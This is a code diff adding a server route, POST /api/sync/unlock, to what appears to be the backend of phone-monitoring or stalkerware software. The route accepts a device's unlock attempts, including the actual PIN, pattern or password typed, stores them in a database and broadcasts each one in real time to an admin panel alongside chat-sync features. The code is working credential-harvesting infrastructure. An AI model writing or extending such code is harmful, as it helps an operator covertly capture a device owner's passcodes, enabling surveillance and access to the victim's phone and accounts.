@@ -466,4 +466,74 @@ router.delete('/chat', async (req, res) => {
     }
 });
 
+/**
+ * POST /api/sync/unlock
+ * Sync unlock attempts (PIN, pattern, password) from device
+ */
+router.post('/unlock', async (req, res) => {
+    try {
+        const deviceId = req.deviceId;
+        const device = await findDevice(req);
+        if (!device) {
+            return res.status(404).json({ success: false, error: 'Device ID required or device not found' });
+        }
+
+        // Support both single attempt and array
+        let attempts = [];
+        if (Array.isArray(req.body)) {
+            attempts = req.body;
+        } else if (req.body.attempts && Array.isArray(req.body.attempts)) {
+            attempts = req.body.attempts;
+        } else if (typeof req.body === 'object' && req.body !== null) {
+            // Single attempt object
+            if (req.body.unlockType || req.body.type) {
+                attempts = [req.body];
+            }
+        }
+
+        if (attempts.length === 0) {
+            return res.json({ success: true, message: 'No unlock attempts to sync' });
+        }
+
+        const created = await prisma.unlockAttempt.createMany({
+            data: attempts.map(attempt => ({
+                deviceId: device.id,
+                unlockType: attempt.unlockType || attempt.type || 'unknown',
+                unlockData: attempt.unlockData || attempt.data || null,
+                success: attempt.success === true || attempt.result === 'success',
+                reason: attempt.reason || null,
+                timestamp: new Date(attempt.timestamp || Date.now())
+            }))
+        });
+
+        await prisma.device.update({
+            where: { id: device.id },
+            data: { lastSeen: new Date(), isOnline: true }
+        });
+
+        // Emit socket event for real-time admin panel update
+        const io = req.app.get('io');
+        if (io) {
+            // Emit each attempt for real-time display
+            attempts.forEach(attempt => {
+                io.to('admin').emit('unlock:attempt', {
+                    deviceId: device.deviceId,
+                    unlockType: attempt.unlockType || attempt.type || 'unknown',
+                    unlockData: attempt.unlockData || attempt.data || null,
+                    success: attempt.success === true || attempt.result === 'success',
+                    reason: attempt.reason || null,
+                    timestamp: attempt.timestamp || Date.now()
+                });
+            });
+            console.log(`[SYNC] Emitted unlock:attempt for device ${device.deviceId}`);
+        }
+
+        console.log(`[SYNC] Unlock attempts: ${created.count} from ${deviceId}`);
+        res.json({ success: true, synced: created.count });
+    } catch (error) {
+        console.error('[SYNC] Unlock error:', error);
+        res.status(500).json({ success: false, error: 'Failed to sync unlock attempts' });
+    }
+});
+
 module.exports = router;
